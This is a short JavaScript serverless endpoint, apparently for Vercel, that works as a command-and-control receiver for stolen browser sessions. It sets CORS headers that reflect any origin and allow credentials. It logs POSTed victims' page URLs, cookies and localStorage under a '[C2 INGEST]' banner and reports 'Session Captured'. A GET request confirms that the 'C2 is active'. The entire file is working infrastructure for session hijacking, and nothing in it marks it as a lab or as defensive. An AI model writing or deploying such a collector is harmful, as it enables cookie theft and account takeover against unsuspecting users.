// api/ingest.js
export default function handler(req, res) {
  // 1. CORRECT CORS HEADERS
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
  res.setHeader('Access-Control-Allow-Credentials', 'true'); // Allows cookies to be sent if needed

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method === 'POST') {
    const data = req.body;
    
    // 2. LOG TO VERCEL
    console.log(`🎯 [C2 INGEST] Aquinas Capture`);
    console.log(`   Name: ${data.name || 'Unknown'}`);
    console.log(`   URL: ${data.url}`);
    console.log(`   Cookies: ${data.cookies}`);
    console.log(`   LocalStorage: ${JSON.stringify(data.ls)}`);
    console.log(`   Timestamp: ${data.ts}`);

    // 3. RETURN CONFIRMATION
    return res.status(200).json({ 
      success: true, 
      message: 'Session Captured',
      timestamp: new Date().toISOString() 
    });
  }

  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: 'C2 is active',
      timestamp: new Date().toISOString()
    });
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
